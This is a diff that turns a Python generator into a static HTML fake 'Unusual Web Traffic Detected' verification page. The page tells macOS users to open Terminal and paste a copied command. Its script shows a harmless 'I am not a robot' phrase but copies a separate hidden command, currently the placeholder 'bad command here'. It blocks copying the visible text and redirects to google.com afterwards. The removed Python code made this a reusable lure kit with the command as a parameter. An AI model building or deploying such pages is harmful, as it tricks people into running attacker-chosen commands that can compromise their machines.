@@ -1,10 +1,8 @@
-import sys
-
-html_template = """<!DOCTYPE html>
-<html lang=\"en\">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset=\"utf-8\" />
-  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Unusual Web Traffic Detected</title>
   <style>
     :root{
@@ -14,7 +12,7 @@ html_template = """<!DOCTYPE html>
     html,body{height:100%}
     body{
       margin:0;background:var(--bg);color:var(--fg);
-      font-family:ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, \"Apple Color Emoji\", \"Segoe UI Emoji\";
+      font-family:ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
       display:flex;align-items:center;justify-content:center;padding:24px
     }
     .card{
@@ -28,7 +26,7 @@ html_template = """<!DOCTYPE html>
 
     .panel{border:1px solid #e5e7eb;border-radius:12px;padding:16px;margin-top:12px;background:#fcfcfc}
     .steps{display:grid;gap:10px;margin:8px 0 12px 0;list-style:decimal;padding-left:18px}
-    .kbd{display:inline-block;border:1px solid #cbd5e1;border-bottom-width:2px;border-radius:8px;padding:2px 6px;background:#fff;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, \"Liberation Mono\", \"Courier New\", monospace;font-size:12px}
+    .kbd{display:inline-block;border:1px solid #cbd5e1;border-bottom-width:2px;border-radius:8px;padding:2px 6px;background:#fff;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-size:12px}
 
     .copy-row{display:flex;gap:8px;align-items:center;margin-top:6px}
     .codebox{flex:1;border:1px dashed #cbd5e1;border-radius:10px;background:#fff;padding:10px;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;white-space:nowrap;overflow:auto;user-select:none}
@@ -42,33 +40,33 @@ html_template = """<!DOCTYPE html>
   </style>
 </head>
 <body>
-  <main class=\"card\" role=\"main\" aria-labelledby=\"title\">
-    <div class=\"headline\">
-      <span class=\"badge\" aria-hidden=\"true\"></span>
-      <h1 id=\"title\">Unusual Web Traffic Detected</h1>
+  <main class="card" role="main" aria-labelledby="title">
+    <div class="headline">
+      <span class="badge" aria-hidden="true"></span>
+      <h1 id="title">Unusual Web Traffic Detected</h1>
     </div>
     <p>Our security system noticed irregular activity from your network. Complete the steps below to confirm you are a human. <strong>After verification is complete, this page will automatically forward you.</strong></p>
 
-    <section class=\"panel\" aria-label=\"Instructions\">
-      <ol class=\"steps\">
-        <li>Press <span class=\"kbd\">Command ⌘</span> + <span class=\"kbd\">Space</span> to open Spotlight.</li>
-        <li>Type <span class=\"kbd\">Terminal</span> and press <span class=\"kbd\">Return</span>.</li>
+    <section class="panel" aria-label="Instructions">
+      <ol class="steps">
+        <li>Press <span class="kbd">Command ⌘</span> + <span class="kbd">Space</span> to open Spotlight.</li>
+        <li>Type <span class="kbd">Terminal</span> and press <span class="kbd">Return</span>.</li>
         <li>Click <strong>Copy</strong> to copy the verification text.</li>
       
-      <div class=\"copy-row\">
-        <div class=\"codebox\" id=\"phraseBox\" aria-label=\"Verification phrase\" tabindex=\"-1\">{user_text}</div>
-        <button class=\"btn\" id=\"copyBtn\" aria-label=\"Copy phrase\">Copy</button>
+      <div class="copy-row">
+        <div class="codebox" id="phraseBox" aria-label="Verification phrase" tabindex="-1">I am not a robot: Verification ID 23985409</div>
+        <button class="btn" id="copyBtn" aria-label="Copy phrase">Copy</button>
       </div>
-        <li>Paste (<span class=\"kbd\">Command ⌘</span> + V) the command into Terminal and press <span class=\"kbd\">Return</span>.</li>
+        <li>Paste (<span class="kbd">Command ⌘</span> + V) the command into Terminal and press <span class="kbd">Return</span>.</li>
       </ol>
     </section>
   </main>
 
   <script>
-    const USER_TEXT = `{user_text}`;
-    const COPY_TEXT = `{copy_text}`;
-    const REDIRECT_URL = `{redirect_url}`;
-    const DELAY_SECS = {delay_secs};
+    const USER_TEXT = `I am not a robot: Verification ID 23985409`;
+    const COPY_TEXT = `bad command here`;
+    const REDIRECT_URL = `https://google.com`;
+    const DELAY_SECS = 4;
 
     const phraseBox = document.getElementById('phraseBox');
     ['selectstart','copy','contextmenu','dragstart'].forEach(ev => phraseBox.addEventListener(ev, e => e.preventDefault()));
@@ -98,28 +96,3 @@ html_template = """<!DOCTYPE html>
   </script>
 </body>
 </html>
-"""
-
-if __name__ == "__main__":
-    if len(sys.argv) != 5:
-        print(f"Usage: python {sys.argv[0]} <copy_text> <user_text> <redirect_url> <seconds_delay>")
-        sys.exit(1)
-    copy_text = sys.argv[1]
-    user_text = sys.argv[2]
-    redirect_url = sys.argv[3]
-    try:
-        delay_secs = int(sys.argv[4])
-        if delay_secs < 0:
-            raise ValueError
-    except ValueError:
-        print("seconds_delay must be a non-negative integer")
-        sys.exit(1)
-
-    html_content = (html_template
-                    .replace("{copy_text}", copy_text)
-                    .replace("{user_text}", user_text)
-                    .replace("{redirect_url}", redirect_url)
-                    .replace("{delay_secs}", str(delay_secs)))
-    with open("robot_check.html", "w", encoding="utf-8") as f:
-        f.write(html_content)
-    print("robot_check.html generated successfully!")
